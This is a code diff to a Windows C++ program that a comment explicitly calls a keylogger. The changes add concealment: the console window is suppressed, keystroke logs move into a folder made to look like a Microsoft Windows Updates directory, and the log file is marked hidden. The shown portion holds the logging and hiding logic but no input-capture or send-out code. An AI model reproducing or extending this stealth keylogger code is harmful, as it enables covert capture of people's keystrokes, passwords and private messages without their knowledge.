@@ -1,15 +1,37 @@
-#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
+#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup") // must be here to avoid the console window, otherwise the program will run with a console window which is not desired for a keylogger
 
 #include <windows.h>
 #include <iostream>
 #include <fstream>
 #include <string>
+#include <shlobj.h> 
+
+std::wstring GetLogPath() {
+    wchar_t path[MAX_PATH];
+    // This finds the "C:\Users\<User>\AppData\Local" folder
+    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
+        std::wstring logDir = std::wstring(path) + L"\\Microsoft\\Windows\\Updates";
+
+        CreateDirectoryW(logDir.c_str(), NULL); //create if doesnt exist
+
+        return logDir + L"\\data_log.txt";
+    }
+    return L"keylog.txt"; 
+}
 
 void WriteToLog(std::wstring text) {
-    std::wofstream logFile("keylog.txt", std::ios::app);
+    static std::wstring finalPath = GetLogPath();
+
+    std::wofstream logFile(finalPath, std::ios::app);
     if (logFile.is_open()) {
         logFile << text;
         logFile.close();
+
+        // if not hidden hide
+        DWORD attributes = GetFileAttributesW(finalPath.c_str());
+        if (!(attributes & FILE_ATTRIBUTE_HIDDEN)) {
+            SetFileAttributesW(finalPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
+        }
     }
 }
 
